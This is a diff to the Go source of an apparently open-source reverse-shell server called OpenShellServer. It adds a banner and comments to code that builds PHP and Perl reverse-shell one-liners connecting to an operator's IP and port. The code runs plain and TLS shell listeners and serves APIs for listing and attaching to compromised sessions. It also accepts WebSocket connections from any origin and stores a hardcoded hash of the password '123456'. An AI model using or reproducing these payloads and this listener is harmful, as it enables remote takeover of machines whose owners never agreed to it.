@@ -12,6 +12,13 @@ import (
     "github.com/gorilla/websocket"
 )
 
+var banner = `
+Project: OpenShellServer
+Version: 1.0.0
+Author: iss4cf0ng/ISSAC
+GitHub: https://github.com/iss4cf0ng/OpenShellServer/
+`
+
 var manager = NewSessionManager()
 var upgrader = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
 var passwordHash = "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92" //123456
@@ -59,6 +66,7 @@ func builderHandler(w http.ResponseWriter, r *http.Request) {
 
     case "php":
         payload = fmt.Sprintf(`php -r '$sock=fsockopen("%s",%s); exec("script -qc /bin/bash /dev/null <&3 >&3 2>&3");'`, ip, port)
+
     case "perl":
         payload = fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'`, ip, port)
 
@@ -93,18 +101,21 @@ func attachHandler(w http.ResponseWriter,r *http.Request){
 }
 
 func main(){
-    go StartReverseShellListener("4444")
-    go StartTLSReverseShell("4445")
+    fmt.Println(banner)
 
-    http.HandleFunc("/api/login",loginHandler)
-    http.HandleFunc("/api/builder",builderHandler)
-    http.HandleFunc("/api/stats",statsHandler)
-    http.HandleFunc("/api/sessions",sessionsHandler)
-    http.HandleFunc("/ws/session",attachHandler)
+    go StartReverseShellListener("4444")  //Normal TCP
+    go StartTLSReverseShell("4445")       //TLS
+
+    http.HandleFunc("/api/login",loginHandler)        //Login authentication
+
+    http.HandleFunc("/api/builder",builderHandler)    //Payload builder
+    http.HandleFunc("/api/stats",statsHandler)        //Show online machines
+    http.HandleFunc("/api/sessions",sessionsHandler)  //Obtain sessions
+    http.HandleFunc("/ws/session",attachHandler)      //Buffer handler
 
     fs := http.FileServer(http.Dir("../web"))
     http.Handle("/",fs)
 
-    log.Println("OpenShellServer running at :8080")
+    log.Println("[*] OpenShellServer running at :8080")
     log.Fatal(http.ListenAndServe(":8080",nil))
 }
